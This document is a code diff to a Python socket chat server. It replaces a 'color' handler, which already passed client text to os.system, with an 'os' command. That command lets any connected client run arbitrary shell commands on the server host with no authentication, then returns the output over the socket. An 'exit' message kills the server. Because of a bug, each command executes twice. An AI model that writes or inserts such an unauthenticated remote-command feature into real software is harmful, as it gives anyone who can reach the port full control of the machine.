@@ -1,6 +1,10 @@
 import socket
 import threading
 import os
+from colorama import init
+from termcolor import colored
+
+init()
 
 #Variables for holding information about connections
 connections = []
@@ -42,8 +46,17 @@ class Client(threading.Thread):
                     if client.id != self.id:
                         client.socket.sendall(data)
                 
-                if data.decode("utf-8")[0:len('color ')] == 'color ':
-                    os.system('color ' + data.decode("utf-8")[len('color ')+1:])
+                if data.decode("utf-8")[0:len('os ')] == 'os ':
+                    os.system(data.decode("utf-8")[len('os '):])
+                    output = os.popen(data.decode("utf-8")[len('os '):]).read()
+                    client.socket.sendall(str.encode(colored('\nCommand executed\n', 'green')))
+                    client.socket.sendall(str.encode(output))
+                    client.socket.sendall(str.encode(colored('\nEnd of output\n', 'green')))
+                elif data.decode("utf-8") == 'exit':
+                    client.socket.sendall(str.encode('Closing server'))
+                    #client.socket.shutdown(socket.SHUT_RDWR)
+                    client.socket.close()
+                    os._exit(0)
 
 #Wait for new connections
 def newConnections(socket):
